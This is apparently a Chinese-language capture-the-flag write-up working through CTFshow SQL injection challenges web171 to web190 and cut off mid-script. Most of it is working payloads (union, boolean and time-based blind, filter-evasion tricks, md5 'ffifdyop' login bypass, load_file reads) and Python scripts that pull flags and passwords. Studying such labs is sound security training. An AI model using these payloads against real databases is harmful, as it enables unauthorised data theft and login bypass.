# CTFSHOW -SQL 注入

重新来做一遍 争取不看wp

还是看了。。。。

 [CTFshow sql注入 上篇(web221-253)-CSDN博客](https://blog.csdn.net/Kracxi/article/details/124094102) 

 [[CTFSHOW]SQL注入(WEB入门)_y4tacker ctfshow-CSDN博客](https://blog.csdn.net/solitudi/article/details/110144623) 

 [CTFshow sql注入 上篇(web171-220)更新中 - 掘金](https://juejin.cn/post/7079386480497393701#heading-12) 

 [【精选】CTFshow-WEB入门-SQL注入(上)_having盲注_bfengj的博客-CSDN博客](https://blog.csdn.net/rfrder/article/details/113664639) 

 [ctfshow学习记录-web入门（sql注入191-200）-CSDN博客](https://blog.csdn.net/m0_48780534/article/details/127244647) 

**目录**

[TOC]





## web171  基本联合注入

拿到题目我们已经知道了是sql注入

所以我们可以直接开始



<img src="https://i-blog.csdnimg.cn/blog_migrate/1a4b31665c95570158109b430321b192.png" alt="" style="max-height:600px; box-sizing:content-box;" />


第一题 不会难道哪里去 所以我们直接进行注入即可

```cobol
1' and 1=2-- +
1' and 1=1-- +
 
实现闭合 
 
-1'+union+select+1,2,3--+%2b  查看字段数

-1'+union+select+1,database(),3--+%2b 查看数据库 ctfshow_web
 
-1'+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema%3ddatabase()--+%2b   

查看表 ctfshow_user

-1'+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name%3d'ctfshow_user'--+%2b
 
查看字段名 id,username,password
 
-1'+union+select+1,group_concat(id,username,password),3+from+ctfshow_user--+%2b

获取flag

这里是bp抓包的格式 不是在页面进行注入的格式
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7c9907f16722ced1f4b742dc6cfdd2f8.png" alt="" style="max-height:262px; box-sizing:content-box;" />


## web172  变为两个字段

```cobol
3' union select 2,3-- +

这题修改为两个字段 

其他和上面无差别

-1'+union+select+1,group_concat(id,username,password)+from+ctfshow_user2--+%2
 
获取flag
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/21638968328cf7d15977ba2bd41e001e.png" alt="" style="max-height:283px; box-sizing:content-box;" />


## web173  没看出区别

```cobol
3' union select 2,database(),3-- +


-1'+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema%3ddatabase()--+%2b   
 
查看表 ctfshow_user
 
-1'+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name%3d'ctfshow_user3'--+%2b

查看字段名 id,username,password

-1' union select 1,group_concat(id,password),3 from ctfshow_user3-- +
 
获取flag
```

## web174 布尔盲注

我们开始写盲注脚本

之前一直写错了 所以我们开始写

```cobol
import requests
 
url = "http://9e7dc39c-5e8a-4608-a025-1f9eddee64a2.challenge.ctf.show/api/v4.php?id="
# payload = "1' and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))={1})-- +"
# payload = "1' and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user4'),{0},1))={1})-- +"
payload = "1' and (ascii(substr((select group_concat(id,'--',username,'--',password)from ctfshow_user4 where username='flag'),{0},1))={1})-- +"
result = ''
flag = ''
for i in range(1,50):
    for j in range(37,128):
        payload1 = payload.format(i,j)
        re = requests.get(url = url+payload1)
        # print(re.text)
        if "admin" in re.text:
            result += chr(j)
            print(result)
```

没有二分法真的很慢的啊。。。 我们研究一下咋写吧

```cobol
import requests
 
url = "http://9e7dc39c-5e8a-4608-a025-1f9eddee64a2.challenge.ctf.show/api/v4.php?id="
# payload = "1' and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))={1})-- +"
# payload = "1' and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user4'),{0},1))={1})-- +"
payload = "1' and (ascii(substr((select group_concat(id,'--',username,'--',password)from ctfshow_user4 where username='flag'),{0},1))>{1})-- +"
result = ''
flag = ''
for i in range(1,50):
    high = 128
    low = 32
    mid = (high + low )//2
    while (high > low):
        payload1 = payload.format(i,mid)
        # print(payload1)
        re = requests.get(url = url+payload1)
        # print(re.text)
        if "admin" in re.text:
            low = mid+1
        else:
            high = mid
        mid = (high+low)//2
        if(chr(mid)==' '):
            break
    result +=chr(mid)
    print(result)
 
        #     print(result)
```

起飞咯 确实快了巨多

其实思路很简单就是 如果回显正确 我们就跟进，将low设置为mid

其实就是

```cobol
32   128   80
 
如果正确
 
80   128   
```

然后一步一步进行缩小 如果错误 ，那么就说明太大了 我们就开始将 high设置为 mid的值 即80

然后需要重新设置mid的值

## web175  时间注入

这里我们能够发现 啥回显都没有了 这里什么东西都没得 1 2 3 都没数据

那么这里如何注入呢 我们可以通过 sleep 进行时间盲注

我们先来了解一下 上面的布尔注入

```csharp
1' and if(ascii(substr((select database()),1,1))>1,sleep(2),1)-- +
```

我们可以发现 时间盲注 其实就是在 if中增加了 sleep的值 让如果>1 就睡2秒 否则回显1

所以我们可以通过时间的计算来进行获取

```cobol
import requests
 
import  time
 
url = "http://5653e881-7c4e-48f9-95e5-8cc4647532b6.challenge.ctf.show/api/v5.php?id="
payload = "1' and if(ascii(substr((select database()),{0},1))={1},sleep(2),1)-- +"
flag =''
for i in range(1,50):
    for j in range(98,128):
        payload1 = payload.format(i,j)
        # print(payload1)
        start_time = time.time()
        re = requests.get(url = url+payload1)
        stop_time = time.time()
        sub_time = stop_time - start_time
        if sub_time > 1.8:
            flag += chr(j)
            print(flag)
            break
```

这里我们就实现了最简单的时间盲注脚本 然后我们可以开始写二分法的

其实这里的二分法 就是判断条件改为时间即可

```cobol
import requests
 
import  time
 
url = "http://5653e881-7c4e-48f9-95e5-8cc4647532b6.challenge.ctf.show/api/v5.php?id="
payload = "1' and if(ascii(substr((select database()),{0},1))>{1},sleep(2),1)-- +"
flag =''
for i in range(1,50):
    high = 128
    low = 32
    mid = (high+low)//2
    while (high>low):
        payload1 = payload.format(i,mid)
        # print(payload1)
        start_time = time.time()
        re = requests.get(url = url+payload1)
        stop_time = time.time()
        sub_time = stop_time - start_time
        if sub_time > 1.8:
            low = mid+1
        else:
            high = mid
        mid = (high+low)//2
        if (chr(mid)==" "):
            break
    flag += chr(mid)
    print(flag)
```

这里我们能够发现 其实都没有怎么变化 只是判断条件改变了 所以其实二分法只需要学会一种即可

然后通过判断条件的改变 就可以写出二分法的时间注入

然后我们更新一下二分法时间注入

```cobol
import requests
 
import  time
 
url = "http://5653e881-7c4e-48f9-95e5-8cc4647532b6.challenge.ctf.show/api/v5.php?id="
# payload = "1' and if(ascii(substr((select database()),{0},1))>{1},sleep(2),1)-- +"
# payload = "1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},sleep(2),1)-- +"
# payload = "1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user5'),{0},1))>{1},sleep(2),1)-- +"
payload = "1' and if(ascii(substr((select group_concat(id,'--',username,'--',password)from ctfshow_user5 where username='flag'),{0},1))>{1},sleep(2),1)-- +"
flag =''
 
for i in range(1,50):
    high = 128
    low = 32
    mid = (high+low)//2
    while (high>mid):
        payload1 = payload.format(i,mid)
        # print(payload1)
        start_time = time.time()
        re = requests.get(url = url+payload1)
        stop_time = time.time()
        sub_time = stop_time - start_time
        if sub_time > 1.8:
            low = mid+1
        else:
            high = mid
        mid = (high+low)//2
        if (chr(mid)==" "):
            break
    flag += chr(mid)
    print(flag)
```

发现不是那么南 只需要你会写盲注的二分法 然后通过修改判断条件即可

## web176 大小写绕过

首先通过 order by 进行测试 可以发现是3个字段

但是通过union select 的时候就发现接口错误

说明过了waf

```sql
这里我们就可以开始对union select 进行测试了 最简单的测试就是 通过大小写绕过
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/122e08a2eb4bd030fe816dcecd6522b8.png" alt="" style="max-height:233px; box-sizing:content-box;" />


发现成功回显 说明后端可能是通过正则对union select进行了过滤

所以我们可以猜测 后端可能是这种语句



<img src="https://i-blog.csdnimg.cn/blog_migrate/c424657272dfe0eae26f280fb9a10c8e.png" alt="" style="max-height:278px; box-sizing:content-box;" />


只对字符串进行匹配 并且不对大小写进行过滤

所以我们就可以开始继续注入了

```csharp
1'  uNIon seLEct 1,group_concat(password),3 from ctfshow_user where username='flag'-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f0579e53df258aefd2f0405446ff7a5d.png" alt="" style="max-height:288px; box-sizing:content-box;" />


## web177 过滤空格绕过

这里我们经过测试 可以发现空格被过滤了

所以这里我们可以通过

```cobol
%a0 %0a () %09 %0c %0d  %0b  
 
并且这里 -- + 不能使用 我们使用 # 但是这里我们需要url编码 就是 %23
```

然后我们就可以进行注入 了 这里也过滤了 union select 但是没有大小写

```csharp
1'/**/Union/**/Select/**/1,2,group_concat(password)from/**/ctfshow_user/**/where/**/username='flag'%23
```

这里的waf我们猜测看可能是这样的



<img src="https://i-blog.csdnimg.cn/blog_migrate/127c082af5c11e836126479cfc5e75b3.png" alt="" style="max-height:291px; box-sizing:content-box;" />


只过滤了 %20 所以我们可以使用其他的方式绕过

## web178 过滤了/**/

这里和上面一题只是过滤了 /**/所以可以使用上面其他方式进行

```csharp
1'%0aUnion%0aSelect%0a1,2,group_concat(password)from%0actfshow_user%0awhere%0ausername='flag'%23
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4603e387f57aa82a01c0ce744888c34d.png" alt="" style="max-height:242px; box-sizing:content-box;" />


这里过滤也只是多加了内容



<img src="https://i-blog.csdnimg.cn/blog_migrate/920261709778bcbd08dc99c4fc9f039d.png" alt="" style="max-height:392px; box-sizing:content-box;" />


解释一下这里的正则



<img src="https://i-blog.csdnimg.cn/blog_migrate/9bf73c297428806365b24b93f206fe04.png" alt="" style="max-height:197px; box-sizing:content-box;" />


```cobol
\/ 这里是匹配 \
 
\* 匹配 *
 
然后.*? 就是贪婪匹配 匹配 /*后的任何
 
然后匹配结尾 
 
\* 匹配后面的*
 
\/ 匹配后面的/
 
这样我们就可以匹配到/**/
```

如果我们只想匹配/**/只需要修改正则即可

```cobol
\/\*\*\/
```

## web179 过滤%0a %09等大多数符号

这道题有个非预期吧 直接通过 1'||1%23就可以输出了



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf80fb4bb8702a6b6460c40c78ed4d19.png" alt="" style="max-height:578px; box-sizing:content-box;" />


这题还是过滤了很多符号 然后我们需要通过 %0c来绕过

```csharp
1'%0cUnion%0cSelect%0c1,2,group_concat(password)from%0cctfshow_user%0cwhere%0cusername='flag'%23
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/44443ed22d0a40b80f2b573643038246.png" alt="" style="max-height:260px; box-sizing:content-box;" />


这里的过滤应该就是讲一些符号加入匹配了



<img src="https://i-blog.csdnimg.cn/blog_migrate/c7f2dcbeb0251786c411c3cbb384fddf.png" alt="" style="max-height:300px; box-sizing:content-box;" />


首先通过url编码获取到值 然后进行匹配

## web180 过滤%23 使用闭合绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/bc44feb360dfaab7555f2bb76175bc1e.png" alt="" style="max-height:232px; box-sizing:content-box;" />


发现过滤了 %23

这里我们只能使用闭合了 使用 or '1 即可

```cobol
-1'%0cUnion%0cSelect%0c5,group_concat(password),3%0c%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%0cor'1'='0
```

## web181  通过 and or 优先级获取flag

开始回显waf了 过滤的有点多啊

```php
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

这里一时间没有思路看了wp发现 这里是可以通过 优先级进行绕过的

```cobol
and > or 
 
所以and会先执行
 
 
1 and 0 ====0
 
 
但是 1 and 0 or 1  就会变为   0 or 1  =====1
 
所以我们可以根据这个特性绕过
```

所以这里我们可以通过

```lisp
-1'||username='flag
```

来获取flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/d402ffc2d0a51a98c0db763c77bcd029.png" alt="" style="max-height:222px; box-sizing:content-box;" />


## web182  通过id查询 获取flag 和上题类似

一样的payload 直接打



<img src="https://i-blog.csdnimg.cn/blog_migrate/f0cb3ac86ccfb43fc8db52a74fd81a1c.png" alt="" style="max-height:297px; box-sizing:content-box;" />


失败了 过滤了flag 所以我们在之前爆破可以知道 id为 26

```cobol
0'||id='26
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5abb05e05932dae6bf1446ef2e709d85.png" alt="" style="max-height:295px; box-sizing:content-box;" />
看了文章 还有一个时间盲注的payload

```cobol
-1'or(id=26)and(if(ascii(mid(password,1,1))>1,sleep(2),1))and'1
 
来解释一下
 
 
0 or 1 and 1 and '1 ======1

0 or 1 and 0 and '1 ======0
 
 
这里就可以实现盲注 但是没有
 
但是在测试的 时候 发现
 
-1'or(id=26)and(if(ascii(mid(password,1,1))>1,1,0))and'1 这个也可以直接爆出flag
 
这里要注意 if(表达式,1,0) 这里的1 是如果表达式真 就输出 1 否则输出 0
 
所以我们前面 >1 这个时候就可以输出flag
 
但是好多此一举啊 因为我们可以直接获取flag 何必盲注呢
```

但是使用二分法 也是很快就是了

## web183 通过闭合from 构造where 实现like匹配内容

这里说实在话 我刚刚进来 没看懂这道题目干嘛



<img src="https://i-blog.csdnimg.cn/blog_migrate/5cb35e8d121a9776d9bb25aebc3cb915.png" alt="" style="max-height:141px; box-sizing:content-box;" />


POST 一个参数 用来查找返回的数量



<img src="https://i-blog.csdnimg.cn/blog_migrate/76b1985f90c081d687c39a19fbce737c.png" alt="" style="max-height:174px; box-sizing:content-box;" />


返回的内容在这里

那我们要怎么实现注入呢 我们还是看看sql的语句

```bash
$sql = "select count(pass) from ".$_POST['tableName'].";";
 
这里我们可以发现
 
正常 我们的查询是where 后面进行注入 但是这里没有where啊？
 
没有where ? 
 
这里我们不就可控吗
 
 
首先通过前面 我们知道了表 是 ctfshow_user 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1071e9c5b28a2d40aab6ba717aa1a1e6.png" alt="" style="max-height:500px; box-sizing:content-box;" />


发现回显了 所以这里是我们获取内容的地方

然后我们知道 这个语句中 不存在 where 那么我们写入where不就好了

```perl
$sql = "select count(pass) from ".$_POST['tableName'].";";
 
修改
 
select count(pass) from "ctfshow_user" where pass = ctf%";
 
这种语句是否可行呢
 
 
当然不可以 毕竟存在过滤 我们开始绕过 空格使用 括号
return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
 
= 使用 like
 
(ctfshow_user)where(pass)like(ctf%)
 
 
这里ctf%是匹配ctf开头的内容 但是这里不行
 
(ctfshow_user)where(pass)like'ctf%'
 
需要这样
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8b9a4af8aca7c80b8936fb783f946080.png" alt="" style="max-height:201px; box-sizing:content-box;" />


payload出来了 那么这么繁琐的内容 肯定就交给脚本咯

```cobol
import string
 
import requests
 
url = "http://742f4f44-a736-424b-aa24-09424fc4210f.challenge.ctf.show/select-waf.php"
 
payload = "(ctfshow_user)where(pass)like'ctfshow{0}"
flag = ''
for i in range(0,100):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz-{}':
        payload1= payload.format(flag+j)+"%'"
        data = {'tableName':payload1}
        re = requests.post(url=url,data=data)
        if "$user_count = 1;" in re.text:
            flag +=j
            print("ctfshow"+flag)
```

这里就可以获取到flag 是通过like的匹配这里

这里我们最好解读一下正则

```lisp
return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
```

首先就是过滤了很多符号防止绕过空格的过滤 其次过滤了 # 防止注释

or = select 也全部被过滤 并且增加了 /i 防止大小写绕过

## web184 过滤了where 通过下面的方法绕过

首先解读正则

```bash
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i',
```

和上面差不多 并且过滤了 where  union 单引号 双引号 内联 sleep

过滤更加严格了

但是放出了空格

我们如何读取内容呢

这里我们可以使用两个方式

regexp和like

这里我们先补充知识点

```sql
 $sql = "select count(*) from ".$_POST['tableName'].";";
 
这里我们可以看见前面使用了 count聚合函数
 
所以我们后面可以使用 group by having 这种用法
 
group by 允许我们按照某个列进行分组
 
having 允许对分组的数据再进行数据的筛选
 
所以我们可以使用
 
 
group by pass having pass like ''  
 
或者
 
group by pass having pass regexp ''
```

但是这里有个问题 就是 单引号双引号被过滤了 我们无法实现

怎么办呢 我们可以转换为 hex 进行执行

这里为什么可以直接通过regexp然后调用16进制

我在本地测试的时候发现 需要通过

```sql
SELECT COUNT(*) FROM admin GROUP BY name HAVING HEX(name) LIKE '61%'
```

这种语句才可以通过十六进制查询 这里为什么可以我还不是很明白

我们可以开始写payload

```cobol
ctfshow_user group by pass having pass like (0x63746673686f777b%)
```

然后我就了然了

这里语句是错误的 因为我们如果使用十六进制拼接% 会报错

所以我们将 % 也转变为hex 就是25

### HAVING 配合 like

```cobol
ctfshow_user group by pass having pass like (0x63746673686f777b25)
```

这个时候 就可以回显正确的值了

这个时候我们只需要通过编写脚本即可

```cobol
import requests
import string
url = "http://0890718d-8277-4712-8927-3ac132f6bd31.challenge.ctf.show/select-waf.php"
 
paylaod = "ctfshow_user group by pass having pass like 0x63746673686f777b{0}"
 
uuid = string.ascii_lowercase+string.digits+"-{}"
def str_to_hex(str):
    return ''.join([hex(ord(c)).replace('0x','') for c in str])
flag =''
for i in range(1,100):
    for j in uuid:
        payload1 = paylaod.format(str_to_hex(flag+j+'%'))
        data = {
            'tableName':payload1
        }
        re = requests.post(url=url,data=data)
        if "$user_count = 1;" in re.text:
            flag+=j
            print("ctfshow{"+flag)
```

### REGEXP

这里有一个问题就是需要25即 %来补充

那我们可不可以不需要25来代表后面还有内容呢

regexp即可

```cobol
ctfshow_user group by pass having pass like (0x63746673686f777b25)
 
这里的代码 我们修改为
 
ctfshow_user group by pass having pass regexp(0x63746673686f777b)
 
即可
```

那我们就再修改一下脚本看看能不能实现  


```cobol
import requests
import string
url = "http://0890718d-8277-4712-8927-3ac132f6bd31.challenge.ctf.show/select-waf.php"
 
paylaod = "ctfshow_user group by pass having pass regexp(0x63746673686f777b{0}"
 
uuid = string.ascii_lowercase+string.digits+"-{}"
def str_to_hex(str):
    return ''.join([hex(ord(c)).replace('0x','') for c in str])
flag =''
for i in range(1,100):
    for j in uuid:
        payload1 = paylaod.format(str_to_hex(flag+j))+")"
        # print(payload1)
        data = {
            'tableName':payload1
        }
        re = requests.post(url=url,data=data)
        if "$user_count = 1;" in re.text:
            flag+=j
            print("ctfshow{"+flag)
```

发现依旧获取了flag

然后这里我好像看wp的时候还发现了一种方式

这里是对where 过滤 提供了新的思路

### INNER join on

这道题目最难受的地方其实就是where被过滤了 我们只要绕过这个就可以了

这里我们可以通过INNER join on 来代替where

内连接

```less
ctfshow_user a inner join ctfshow_user b on b.pass like (0x...)
```

这里其实就是

 [SQL INNER JOIN 关键字 | 菜鸟教程](https://www.runoob.com/sql/sql-join-inner.html) 

这个讲的很清楚了 我们这里就是为了通过代替where 然后返回数值

简单来说就是两个表 当内连接后 将on后面条件符合的内容返回

所以这里我们修改也可以跑出来

这里需要注意修改

```cobol
$user_count = 22;
```

然后我们就可以获取到flag了

```cobol
import requests
import string
url = "http://0890718d-8277-4712-8927-3ac132f6bd31.challenge.ctf.show/select-waf.php"
 
paylaod = "ctfshow_user a inner join ctfshow_user b on b.pass like 0x63746673686f777b{0}"
 
uuid = string.ascii_lowercase+string.digits+"-{}"
def str_to_hex(str):
    return ''.join([hex(ord(c)).replace('0x','') for c in str])
flag =''
for i in range(1,100):
    for j in uuid:
        payload1 = paylaod.format(str_to_hex(flag+j+'%'))
        # print(payload1)
        data = {
            'tableName':payload1
        }
        re = requests.post(url=url,data=data)
        if "$user_count = 22;" in re.text:
            flag+=j
            print("ctfshow{"+flag)
            break
```

## ⭐⭐web185  过滤了数字 ，通过True绕过

依旧 查看一下过滤内容

```bash
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
```

这里好像没啥差别 空格也没有过滤 但是这里有个问题 过滤了数字

这里我就不会了

首先我们记录一下mysql中函数可以获取的数字



<img src="https://i-blog.csdnimg.cn/blog_migrate/747ee8607614df5439a57045a2b1fc1a.png" alt="" style="max-height:611px; box-sizing:content-box;" />


首先我们来了解一下 true

### TRUE变为数字



<img src="https://i-blog.csdnimg.cn/blog_migrate/e46e4e7b6a5a2c583e7326cf979e07ef.png" alt="" style="max-height:221px; box-sizing:content-box;" />


所以我们可以通过True的相加获取数字

我们这里的内容是通过上面的十六进制脚本获取的

然后我们可以通过



<img src="https://i-blog.csdnimg.cn/blog_migrate/2e80e858c1deae28b368137d50cc5982.png" alt="" style="max-height:224px; box-sizing:content-box;" />


来获取十六进制

所以我们开始编写脚本



<img src="https://i-blog.csdnimg.cn/blog_migrate/569f82e72680af2765ab5fce8de69417.png" alt="" style="max-height:809px; box-sizing:content-box;" />


从这里我们就可以看出来 是通过True来作为数字

```cobol
def createNum(s):
    num = 'true'
    if s == 1:
        return 'true'
    else:
        for i in range(s-1):
            num +='+true'
        return num
 
def createStrNum(n):
    str=''
    str+="chr("+createNum(ord(n[0]))+")"
    for i in n[1:]:
        str += ",chr(" + createNum(ord(i)) + ")"
    return str
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1a33371b348dab0422a1c45091a69e65.png" alt="" style="max-height:741px; box-sizing:content-box;" />


我们来解释一下

```cobol
def createNum(s):
    num = 'true' 首先这里是把数字定义为true
    if s == 1:   如果只是1 那么就返回一个true
        return 'true'
    else:
        for i in range(s-1):  否则就返回 s个true
            num +='+true'  这里看似是s-1 但是这里是 num+= 所以还是s个
        return num
 
def createStrNum(n):
    str=''
    str+="chr("+createNum(ord(n[0]))+")" 这里更简单了 其实就是输出一个字符串罢了
首先将 第一个字符转为true格式 然后再加上chr 即可
    for i in n[1:]:
        str += ",chr(" + createNum(ord(i)) + ")"
这里就是除了第一个后面 也按照这种格式进行  但是这里需要通过，
    return str
 
 
给出个例子大家就明白了
 
我们现在输入一个 3 
 
其本身的ascii值为51 
 
然后通过 createNum 获取到 51个 true
 
然后放入 createStrNum中
 
就变为了 chr(true+true+.....+true)
```

这里我们就可以绕过数字过滤了

这里我们要注意 我们在payload 中需要加上 concat 将其chr后组合为一个字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/7f3cdb2d9e6f01228d45283115e7ee73.png" alt="" style="max-height:286px; box-sizing:content-box;" />


发现 组合为一起了 这样子 我们才可以构成 0x6164 这种

```cobol
import string
 
import requests
 
url = 'http://6ec04948-9cb4-4ed1-9cc8-d72f9ab75d93.challenge.ctf.show/select-waf.php'
 
payload = 'ctfshow_user group by pass having pass like(concat({}))'
 
flag ='ctfshow{'
 
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n-1):
            num+="+true"
        return num
 
def createStrNum(c):
    str=''
    str += 'chr('+createNum(ord(c[0]))+')'
    for i in c[1:]:
        str +=',chr(' + createNum(ord(i)) + ')'
    return str
 
uuid = string.ascii_lowercase + string.digits + "-{}"
 
for i in range(1,50):
    for j in uuid:
        payload1 =payload.format(createStrNum(flag+j+"%"))
        # print(payload1)
        data = {
            'tableName':payload1
        }
        re = requests.post(url=url,data=data)
        if "$user_count = 0;" not in re.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
            break
```

这个题目确实南 需要好好看

## web186

发现过滤了无关紧要的东西 我们上一题的payload直接打就行了

```cobol
import string
 
import requests
 
url = 'http://1ca9c268-b33b-48d1-9f3a-1d8c9b507696.challenge.ctf.show/select-waf.php'
 
payload = 'ctfshow_user group by pass having pass like(concat({}))'
 
flag ='ctfshow{'
 
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n-1):
            num+="+true"
        return num
 
def createStrNum(c):
    str=''
    str += 'chr('+createNum(ord(c[0]))+')'
    for i in c[1:]:
        str +=',chr(' + createNum(ord(i)) + ')'
    return str
 
uuid = string.ascii_lowercase + string.digits + "-{}"
 
for i in range(1,50):
    for j in uuid:
        payload1 =payload.format(createStrNum(flag+j+"%"))
        # print(payload1)
        data = {
            'tableName':payload1
        }
        re = requests.post(url=url,data=data)
        if "$user_count = 0;" not in re.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
            break
```

## web187 md5 + sql ==密码

看到md5我们就可以将sql注入和md5的特殊字符串联系起来

```cobol
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

执行查看回显即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/ba9aac8e87a5273b387dfac6c35c2168.png" alt="" style="max-height:196px; box-sizing:content-box;" />


## web188 弱比较绕过

这里我确实没看懂

但是看了wp 恍然大悟

```php
  $sql = "select pass from ctfshow_user where username = {$username}";
```

这个是我们的查询语句 变量直接放在 sql语句中 所以我们可以进行构造

这里有一个最简单的就是万能密码

```php
  $sql = "select pass from ctfshow_user where username = {$username}";
 
变为
 
  $sql = "select pass from ctfshow_user where username = 1||1";
```

那么就可以登入成功了

这里还有一个方式 username=0

这个时候 会返回所有的内容



<img src="https://i-blog.csdnimg.cn/blog_migrate/7b5bee5dc37cdb32b449676a0b1b4ada.png" alt="" style="max-height:210px; box-sizing:content-box;" />


为什么呢 因为 name一般都是字符

在mysql中

字符和数字进行比较 会将字符变为 0 开头的

所以就可以比对成功

然后我们需要绕过密码

```php
  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```

这里其实也是一样的 如果pass 是字符 那么就返回0 所以password=0 就可以登入成功

所以这里有两个payload

```cobol
username=1||1&password=0
 
username=0&password=0
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/550bf2b0e8bb89603695e624d402644c.png" alt="" style="max-height:551px; box-sizing:content-box;" />


## web189 盲注读取文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/a68067577bdb939404dcef340e369ffc.png" alt="" style="max-height:169px; box-sizing:content-box;" />


这里我们先学习一下 mysql读取文件的方式

我们可以通过 load_file实现

```cobol
MariaDB [test]> select load_file('/mnt/c/Users/Administrator/Desktop/1.txt');
+-------------------------------------------------------+
| load_file('/mnt/c/Users/Administrator/Desktop/1.txt') |
+-------------------------------------------------------+
| aaa                                                   |
+-------------------------------------------------------+
```

这里我们发现 可以读取 那么如何配合盲注呢

这里我们首先介绍一下 我们可以通过正则来匹配

这里我们来进行实验



<img src="https://i-blog.csdnimg.cn/blog_migrate/5871cfde716136261ccbd9815752f641.png" alt="" style="max-height:215px; box-sizing:content-box;" />


1.txt的内容为 aaa

我们如何通过读取呢

我们使用if

```lisp
if((load_file('/mnt/c/Users/Administrator/Desktop/1.txt'))regexp(""),0,1)
```

这里其实就是通过读取文件内容 然后经过正则匹配 如果是这些 就返回 1 否则返回 0

然后我们就可以在 regexp 后面进行输入内容 这里是aaa

```cobol
select count(*) from user where name = if((load_file('/mnt/c/Users/Administrator/Desktop/1.txt'))regexp('aa'),0,1);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fc70732196530c95dde8d2327697df58.png" alt="" style="max-height:148px; box-sizing:content-box;" />


发现识别到 是 aa 所以返回 1  这样我们就可以返回count(*)

我们试试看错误的

```cobol
select count(*) from user where name = if((load_file('/mnt/c/Users/Administrator/Desktop/1.txt'))regexp('aab'),0,1);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/12acc348a412c7cd167515b58d6d3409.png" alt="" style="max-height:140px; box-sizing:content-box;" />


发现错误 所以返回0 所以不会执行前面的 count(*)

这样我们就可以实现盲注了

这里我们就可以开始写脚本了

到这题 其实就是 1 的话就出现 查询错误 0 就出现密码错误

然后我们就可以根据这个来写

password 还是 0

根据 上一题的 弱比较

```cobol
import string
 
import requests
 
url = "http://1f66dd86-549d-4dd2-be19-9b90b21b11e0.challenge.ctf.show/api/"
payload = """if((load_file("/var/www/html/api/index.php"))regexp("{0}"),0,1)"""
 
uuid = string.ascii_lowercase+ string.digits + "-{}"
flag = "ctfshow{"
for i in range(1,100):
    for j in uuid:
        payload1=payload.format(flag+j)
        data ={
            'username':payload1,
            'password':0
        }
        re = requests.post(url=url,data=data)
        # print(re.text)
        # print(payload1)
        if r"""{"code":0,"msg":"\u5bc6\u7801\u9519\u8bef","count":0,"data":[]}""" in re.text:
            flag +=j
            print(flag)
            if j == "}":
                exit()
            break
```

最终实现了注入

## web190 布尔盲注

啥都没过滤的布尔盲注

```cobol
import string
 
import requests
 
url = "http://eb03d743-6ff1-4788-8972-29b7e88b2e52.challenge.ctf.show/api/"
# payload = """admin' and if(ascii(substr((select database()),{0},1))>{1},1,0)-- +"""
# payload = "admin' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)-- +"
# payload = "admin' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{0},1))>{1},1,0)-- +"
# flag = "ctfshow{"
payload = "admin' and if(ascii(substr((select group_concat(id,'---',f1ag)from ctfshow_fl0g),{0},1))>{1},1,0)-- +"
flag = ''
for i in range(1,100):
    high = 128
    low = 32
    mid =(high+low)//2
    while (high>low):
        payload1=payload.format(i,mid)
        # print(payload1)
        data ={
            'username':payload1,
            'password':0
        }
        re = requests.post(url=url,data=data)
        # print(re.text)
        # print(payload1)
